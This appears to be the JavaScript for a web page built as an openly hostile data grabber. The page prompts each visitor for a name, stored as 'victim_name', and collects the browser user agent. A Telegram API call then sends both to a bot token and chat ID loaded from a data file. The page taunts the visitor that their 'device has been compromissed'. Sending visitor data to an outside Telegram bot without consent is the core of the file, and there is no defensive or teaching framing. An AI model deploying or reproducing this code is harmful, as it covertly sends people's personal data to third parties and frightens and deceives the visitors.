function log_msg(message, title) {
    document.getElementById("log").innerHTML += message + "\n";

    if (title) {
        document.getElementById("log-title").innerHTML = title;
    }
}

async function load_data(path) {
    try {
        const res = await fetch(path);
        const data = res.json();
        return data
    }catch (error) {
        log_msg(error)
    }
}

async function load() {
    let victim_name = localStorage.getItem("victim_name")
    if (!victim_name) {
        victim_name =  prompt("Your Name (required): ")
        if (!victim_name) {
            alert("Name wasn't given, please try again!")
            window.location.reload()
            return
        }

        localStorage.setItem("victim_name", victim_name)
    }

    log_msg("[+] Please wait...", "Please wait...")
    log_msg("[+] Getting device info...")

    let device_info = navigator.userAgent;

    log_msg("[+] Information:")
    log_msg(device_info)

    const data = await load_data("./assets/data.json")
    bot_token = data.BOT_TOKEN
    chat_id = data.CHAT_ID
    
    if (!bot_token || !chat_id) {
        log_msg("Error: Required data are missing..", "Error occured!")
        return
    }
    
    log_msg("[+] Sending information...")

    let message = `<b>${victim_name}:</b> <code>${device_info}</code>`

    let url = `https://api.telegram.org/bot${bot_token}/sendMessage?chat_id=${chat_id}&parse_mode=HTML&text=${message}`;

    let req = new XMLHttpRequest();
    req.open("POST", url, true);
    req.send();
    req.onload = function() {
        if (req.status == 200) {
            log_msg("[+] Information successfully sent!", "Your device has been compromissed! :)")

        }else {
            log_msg("[-] Information wasn't sent! Error: " + req.responseText, "You got lucky buddy :(")
        }
    }
}
